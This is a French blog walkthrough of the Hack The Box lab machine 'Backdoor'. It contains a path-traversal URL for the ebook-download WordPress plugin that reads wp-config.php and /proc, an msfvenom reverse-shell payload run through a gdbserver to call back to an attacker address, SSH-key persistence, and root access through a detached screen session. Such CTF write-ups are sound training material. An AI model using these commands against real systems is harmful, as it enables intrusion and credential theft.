---
title: "HTB - Backdoor sans MetaSploit"
date: 2022-05-03
categories: ["hacking", "Guides"]
tags: [HTB]
featuredImage: "/images/2022/03/Backdoor_Logo.png"
---
## Intro
Pour ce premier article en Français, nous allons nous attaquer à Backdoor. Nous avons affaire à un Wordpress à jour mais avec un plugin vulnérable qui par le biais d'une `LFI` et d'un serveur distant `gdb` nous permettra d'obtenir les droits "root". Allons-y !

## Cible
[HTB - Backdoor](https://app.hackthebox.com/machines/Backdoor)

## Reconnaissance
Petite reconnaissance basique en fonction des logos et autres infos :

* Il s'agit d'un système Linux ;
* ...

Et c'est tout !

## Énumération
Lançons notre scan `nmap`:

```text
sudo nmap -sC -sV -oA scans\Backdoor.htb
```
```text
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-15 14:45 CET                                                                                                                                                   
Nmap scan report for Backdoor.htb.214                                                                                                                                                                               
Host is up (0.043s latency).                                                                                                                                                                                      
Not shown: 998 closed tcp ports (reset)                                                                                                                                                                           
PORT   STATE SERVICE VERSION                                                                                                                                                                                      
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                                                                                                                                 
| ssh-hostkey:                                                                                                                                                                                                    
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)                                                                                                                                                    
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)                                                                                                                                                   
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)                                                                                                                                                 
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))                                                                                                                                                               
|_http-server-header: Apache/2.4.41 (Ubuntu)                                                                                                                                                                      
|_http-generator: WordPress 5.8.1                                                                                                                                                                                 
|_http-title: Backdoor &#8211; Real-Life                                                                                                                                                                          
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                                                                                                           
                                                                                                                                                                                                                  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                                                    
Nmap done: 1 IP address (1 host up) scanned in 9.80 seconds 
```
Nous pouvons voir les services classiques pour une box Linux : SSH et un serveur web sur le port 80 qui fait tourner Wordpress.

Sachant qu'il s'agit d'un serveur web, j'aime bien lancer `Gobuster` pour essayer de trouver des chemins cachés :

```text
gobuster dir -u http://Backdoor.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 20 -o scans/gobuster
```
```text
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://Backdoor.htb.214
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/03/15 14:46:36 Starting gobuster in directory enumeration mode
===============================================================
/wp-admin             (Status: 301) [Size: 319] [--> http://Backdoor.htb/wp-admin/]
/wp-includes          (Status: 301) [Size: 322] [--> http://Backdoor.htb/wp-includes/]
/wp-content           (Status: 301) [Size: 321] [--> http://Backdoor.htb/wp-content/] 
/server-status        (Status: 403) [Size: 279]                                         
Progress: 23947 / 62284 (38.45%)                                                       [ERROR] 2022/03/15 14:47:05 [!] parse "http://Backdoor.htb/error\x1f_log": net/url: invalid control character in URL
                                                                                        
===============================================================
2022/03/15 14:47:48 Finished
===============================================================
```
Ce scan ne nous révèle pas grand chose... Mais puisqu'il s'agit d'un Wordpress, nous allons lancer `wpscan`.

```
wpscan --url http://Backdoor.htb
```

 ```
______________________________________________________________           
         __          _______   _____          
         \ \        / /  __ \ / ____|                                                                    
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®                                                                                                                                                            
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|               
                                                    
         WordPress Security Scanner by the WPScan Team                       
                         Version 3.8.17                                                                  
       Sponsored by Automattic - https://automattic.com/                                    
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________
                                                                                                                                                                                                                  
[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]Y
[i] Updating the Database ...
[i] Update completed.                                                                                    
                                                    
[+] URL: http://Backdoor.htb.214/ [Backdoor.htb.214]
[+] Started: Tue Mar 15 14:46:02 2022 
                                                                                                                                                                                                                  
Interesting Finding(s):
                                                    
[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu) 
 | Found By: Headers (Passive Detection)
 | Confidence: 100%                                                                                      
                                                                                                                                                                                                                  
[+] XML-RPC seems to be enabled: http://Backdoor.htb.214/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:                                                                                           
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API                                                
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
                                                    
[+] WordPress readme found: http://Backdoor.htb.214/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%       
 
[+] Upload directory has listing enabled: http://Backdoor.htb.214/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://Backdoor.htb.214/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.8.1 identified (Insecure, released on 2021-09-09).
 | Found By: Rss Generator (Passive Detection)
 |  - http://Backdoor.htb.214/index.php/feed/, <generator>https://wordpress.org/?v=5.8.1</generator>
 |  - http://Backdoor.htb.214/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.8.1</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://Backdoor.htb.214/wp-content/themes/twentyseventeen/
 | Last Updated: 2022-01-25T00:00:00.000Z
 | Readme: http://Backdoor.htb.214/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 2.9
 | Style URL: http://Backdoor.htb.214/wp-content/themes/twentyseventeen/style.css?ver=20201208
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.8 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://Backdoor.htb.214/wp-content/themes/twentyseventeen/style.css?ver=20201208, Match: 'Version: 2.8'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <===================================================================================================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Mar 15 14:46:06 2022
[+] Requests Done: 181
[+] Cached Requests: 5
[+] Data Sent: 45.04 KB
[+] Data Received: 18.321 MB
[+] Memory used: 234.484 MB
[+] Elapsed time: 00:00:04
 ```
Pas grand chose à se mettre sous la dent... mais pendant que mes scans tournent en arrière plan, j'aime bien surfer manuellement sur le site "cible". Dans notre cas, j'ai vu que le "directory listing" était activé, et j'ai donc découvert un plugin intéressant.

Pour info, nous aurions aussi pu lancer un `wpscan` agrressif pour découvrir ce même plugin :
```
wpscan --url http://backdoor.htb --plugins-detection aggressive
```

```
[+] Enumerating All Plugins (via Aggressive Methods)                                                                                                                                                       [0/822]
 Checking Known Locations - Time: 00:07:56 <==============================================================================================================================> (97256 / 97256) 100.00% Time: 00:07:56
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://backdoor.htb/wp-content/plugins/akismet/
 | Latest Version: 4.2.2
 | Last Updated: 2022-01-24T16:11:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://backdoor.htb/wp-content/plugins/akismet/, status: 403
 |
 | The version could not be determined.

[+] ebook-download
 | Location: http://backdoor.htb/wp-content/plugins/ebook-download/
 | Last Updated: 2020-03-12T12:52:00.000Z
 | Readme: http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt
 | [!] The version is out of date, the latest version is 1.5
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://backdoor.htb/wp-content/plugins/ebook-download/, status: 200
 |
 | Version: 1.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt
```

Nous voyons donc ce plugin: `ebook-download` qui est [vulnérable](https://www.exploit-db.com/exploits/39575). Nous pouvons par exemple récupérer le fichier `wp-config.php` via cette URL : `http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php`. 

Malheureusement, cela ne nous aide pas... le mot de passe utilisé par le compte `MySQL` n'est pas le même que celui de `root`, ni même de l'utilisateur qui s'appelle d'ailleurs `user` (d'après le fichier `/etc/passwd` que nous pouvons aussi récupérer via cette LFI).

## Exploitation

Cependant, Linux maintient une liste de processus dans `/proc` et cela est accessible par n'importe qui. Après avoir vérifié que cela fonctionne avec `Burp`,  nous pouvons écrire un petit bout de script pour automatiser la chose :

```
for i in $(seq 0 2000); do echo -n "$i: "; curl "http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=//proc/$i/cmdline" --output -; echo; done | tee pid.lst
```

![Backdoor PS List](/images/2022/03/Backdoor_GDB.png)

NB : a noter que le "//", est une sorte d'abréviation pour remplacer les moultes "../../" qui permettent de remonter du `webdir` jusqu'à la racine du système.

Ce script est très sommaire et mériterait quelques coups de `sed` / `awk` pour nettoyer l'`output`, cependant, il nous révèle la présence d'un serveur `gdb` sur le port 1337 que nous avions raté lors de notre scan `nmap` initial.


### Obtenir un premier shell

Après quelques secondes de lectures sur [la bible du PenTest](https://book.hacktricks.xyz/network-services-pentesting/pentesting-remote-gdbserver), nous trouvons une méthode pour exploiter un serveur distant `gdb` :

```
# Trick shared by @B1n4rySh4d0w
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 PrependFork=true -f elf -o binary.elf

chmod +x binary.elf

gdb binary.elf

# Set remote debuger target
target extended-remote 10.10.10.11:1337

# Upload elf file
remote put binary.elf binary.elf

# Set remote executable file
set remote exec-file /home/user/binary.elf

# Execute reverse shell executable
run

# You should get your reverse-shell
```

En effet, nous obtenons bien un shell ! Obtenir le `flag user` est donc un jeu d'enfant, via la commande `cat` :

![Backdoor User Flag](/images/2022/03/Backdoor_User_Flag.png)


### PrivEsc

Avant de travailler sur le PrivEsc, j'aime bien sécuriser mon accès en y déposant ma clef ssh. Pour rappel, on la génère avec :

`ssh-keygen -f backdoor`

NB : pas de "mot de passe", je génère une nouvelle clef pour chaque box, que je nomme du nom de la box.

Ensuite, nous l'inscrivons dans le fichier `authorized_keys` de l'utilisateur que nous venons de pwn.

`echo xxxxxxxx > ~/.ssh/authorized_keys`

avec "xxxxxxxx", étant le contenu de votre fichier backdoor.pub.

Enfin, n'oubliez pas de changer les droits, sur le serveur distant :

`chmod 600 ~/.ssh/authorized_keys`

et sur votre clef juste créée :

`chmod 600 backdoor`

Nous pouvons nous reconnecter en SSH avec un shell digne de ce nom.

Peut-être l'aviez-vous remarqué avant, mais nous avons aperçu qu'une session du logiciel `screen` tournait sur le serveur. C'est toujours intéressant, et cela mérite d'y regarder de plus près via la liste des process :

`ps faux`

![Backdoor PS Screen](/images/2022/03/Backdoor_PS_Screen.png)

Effectivement, `screen` tourne en tant que `root` avec les arguments `dmS root`. Après une inspection du `man`, cela veut dire que `screen` a été lancé en mode détaché avec le nom de session `root`.

Pour récupérer la session, il suffit de taper :

`screen -dr root/992.root`


Et bingo, nous sommes `root` et pouvons récupérer le `flag root` :

![Backdoor Root Flag](/images/2022/03/Backdoor_Root_Flag.png)

## Outro

Une nouvelle box plutôt fun, qui m'a permis de jouer avec le contenu de `/proc` afin de retrouver les processus actifs du serveur. Mais aussi une box, qui m'a rappelé que les scans `nmap` rapides, c'est bien joli, mais ça ne voit pas tout. 

A l'avenir, il pourrait aussi être opportun de lancer un `nmap -p-` en arrière-plan, histoire de...